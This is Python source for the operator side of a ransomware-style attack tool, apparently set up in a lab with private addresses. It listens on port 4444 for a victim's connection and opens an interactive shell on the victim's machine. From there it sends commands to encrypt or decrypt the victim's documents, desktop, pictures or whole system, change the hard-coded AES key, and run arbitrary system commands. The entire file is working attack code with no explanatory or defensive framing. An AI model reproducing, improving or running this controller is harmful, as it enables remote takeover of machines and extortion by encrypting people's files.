#!/usr/bin/env python3
"""
ATTACKER - System-wide encryption (FIXED VERSION)
No Crypto dependencies - uses cryptography library
IP: 192.168.174.128
"""
import socket
import sys
import time
import os
import base64

class Attacker:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.current_victim_id = None
        
        # PRE-SHARED AES KEY (Same on both sides)
        self.aes_key_hex = "00112233445566778899aabbccddeeff00112233445566778899aabbccddeeff"
        self.aes_key = bytes.fromhex(self.aes_key_hex)
        
        print(f"[+] Using AES-256 key: {self.aes_key_hex[:16]}...")

    def start(self):
        """Start attacker"""
        print("\n" + "=" * 60)
        print("ATTACKER - System Encryption (FIXED)")
        print("=" * 60)
        print(f"[*] Attacker IP: 192.168.174.128")
        print(f"[*] Listening Port: {self.port}")
        print(f"[*] Victim IP: 192.168.174.129")
        print("[*] Using pre-shared AES key")
        print("[*] Waiting for victim...\n")

        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[+] Listening on {self.host}:{self.port}")

            self.client_socket, self.client_address = self.server_socket.accept()
            victim_ip = self.client_address[0]
            victim_port = self.client_address[1]
            self.current_victim_id = f"{victim_ip}:{victim_port}"

            print(f"[+] VICTIM CONNECTED: {self.current_victim_id}")

            welcome_msg = f"""
[+] ==============================================
[+] SYSTEM ENCRYPTION ATTACK - ACTIVE
[+] ==============================================
[+] Attacker: 192.168.174.128
[+] Victim: {victim_ip}
[+] Time: {time.ctime()}
[+] AES Key: {self.aes_key_hex[:16]}...
[+] Connection: ESTABLISHED
[+] Type 'help' for commands
[+] ==============================================\n
"""
            self.client_socket.send(welcome_msg.encode())
            
            # Send ready signal
            print("[+] Sending READY signal to victim...")
            self.client_socket.send(b"READY")
            
            # Wait for victim ready response
            victim_response = self.client_socket.recv(1024).decode()
            if victim_response == "VICTIM_READY":
                print("[+] Victim is ready for commands")
            else:
                print(f"[!] Unexpected victim response: {victim_response}")
            
            # Start interactive shell
            self.interactive_shell()

        except KeyboardInterrupt:
            print("\n[*] Stopped by user")
        except Exception as e:
            print(f"\n[-] Error: {str(e)}")
            import traceback
            traceback.print_exc()
        finally:
            self.cleanup()

    def interactive_shell(self):
        """Interactive command shell"""
        print("\n[+] ENCRYPTION SHELL READY")
        print("[+] Type 'help' for commands\n")

        while self.running:
            try:
                command = input(f"\nattacker@{self.current_victim_id}> ").strip()

                if not command:
                    continue

                if command.lower() == "exit":
                    print("[*] Closing connection...")
                    self.send_command("exit")
                    break

                if command.lower() == "help":
                    self.show_help()
                    continue

                if command.lower() == "clear":
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                    
                if command.lower() == "key":
                    print(f"[+] AES-256 Key: {self.aes_key_hex}")
                    continue
                    
                if command.lower().startswith("setkey "):
                    parts = command.split(" ", 1)
                    if len(parts) == 2:
                        try:
                            new_key = bytes.fromhex(parts[1])
                            if len(new_key) == 32:
                                self.aes_key = new_key
                                self.aes_key_hex = new_key.hex()
                                print(f"[+] New key: {self.aes_key_hex[:16]}...")
                                # Send to victim
                                self.send_command(f"setkey {self.aes_key_hex}")
                            else:
                                print("[-] Key must be 64 hex chars (32 bytes)")
                        except:
                            print("[-] Invalid hex key")
                    continue

                # Send command to victim
                self.send_command(command)

                # Handle special commands that need extra processing
                if command.lower() in ["scan", "status"]:
                    self.wait_for_response()
                    continue
                
                if command.lower().startswith("encrypt"):
                    print("[+] Sending encryption command...")
                    self.wait_for_response()
                    continue
                    
                if command.lower() == "decrypt":
                    print("[+] Sending decryption command...")
                    self.wait_for_response()
                    continue

                # Regular command output
                print("\n" + "=" * 60)
                print("[VICTIM OUTPUT]")
                print("=" * 60)
                self.wait_for_response(show_border=False)
                print("=" * 60)

            except KeyboardInterrupt:
                print("\n[*] Sending exit command...")
                self.send_command("exit")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                import traceback
                traceback.print_exc()
                break

    def send_command(self, command):
        """Send command to victim"""
        try:
            self.client_socket.send(command.encode())
        except Exception as e:
            print(f"[-] Failed to send command: {e}")

    def wait_for_response(self, show_border=True):
        """Wait for victim response"""
        try:
            response = b""
            self.client_socket.settimeout(30)
            
            while True:
                try:
                    chunk = self.client_socket.recv(4096)
                    if not chunk:
                        break
                    
                    response += chunk
                    
                    # Check for END_OF_OUTPUT marker
                    if b"END_OF_OUTPUT" in chunk:
                        # Extract everything before END_OF_OUTPUT
                        response_parts = response.split(b"END_OF_OUTPUT")
                        if len(response_parts) > 0:
                            response = response_parts[0]
                        break
                        
                except socket.timeout:
                    print("[!] Timeout waiting for response")
                    break
                except Exception as e:
                    print(f"[!] Error receiving data: {e}")
                    break
            
            if response:
                try:
                    decoded = response.decode('utf-8', errors='ignore')
                    if show_border:
                        print(f"[VICTIM RESPONSE]\n{decoded}")
                    else:
                        print(decoded)
                except:
                    print("[!] Could not decode response")
            else:
                print("[!] No response received")
                
        except Exception as e:
            print(f"[-] Error waiting for response: {e}")
        finally:
            self.client_socket.settimeout(None)

    def show_help(self):
        """Show help menu"""
        help_text = """
[+] ==============================================
[+] ATTACKER COMMANDS - SYSTEM ENCRYPTION
[+] ==============================================
[+] ENCRYPTION/DECRYPTION:
    encrypt [target] - Encrypt files in target location
                       Targets: all, system, documents, desktop, 
                                downloads, pictures, music, videos
                       Example: encrypt documents
                       Example: encrypt all
    decrypt          - Decrypt all encrypted files
    
[+] KEY MANAGEMENT:
    key              - Show current AES key
    setkey <hex>     - Set new AES key (64 hex chars)
    
[+] SYSTEM INFO:
    scan             - Scan system for target files
    status           - Show encryption status
    
[+] VICTIM CONTROL:
    help             - Show this help
    exit             - Exit and close connection
    clear            - Clear screen
    
[+] VICTIM SYSTEM COMMANDS:
    whoami           - Current user
    systeminfo       - System information
    dir              - List files
    ipconfig         - Network info
    tasklist         - Running processes
    <any cmd command>

[+] ==============================================
[+] CONFIGURATION:
    • Attacker IP: 192.168.174.128
    • Victim IP: 192.168.174.129
    • Port: 4444
    • Algorithm: AES-256-GCM / ChaCha20-Poly1305
    • Libraries: cryptography
[+] ==============================================
"""
        print(help_text)

    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        print("\n[*] Connection closed")
        print("[*] Attacker stopped")

def main():
    """Main function"""
    try:
        # Check if cryptography is available
        import cryptography
        print("[+] Cryptography library: OK")
    except ImportError:
        print("[-] ERROR: cryptography library not installed!")
        print("[*] Install with: pip install cryptography")
        sys.exit(1)
    
    try:
        ATTACKER_PORT = 4444
        attacker = Attacker(port=ATTACKER_PORT)
        attacker.start()
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    print("[+] ATTACKER - Starting...")
    main()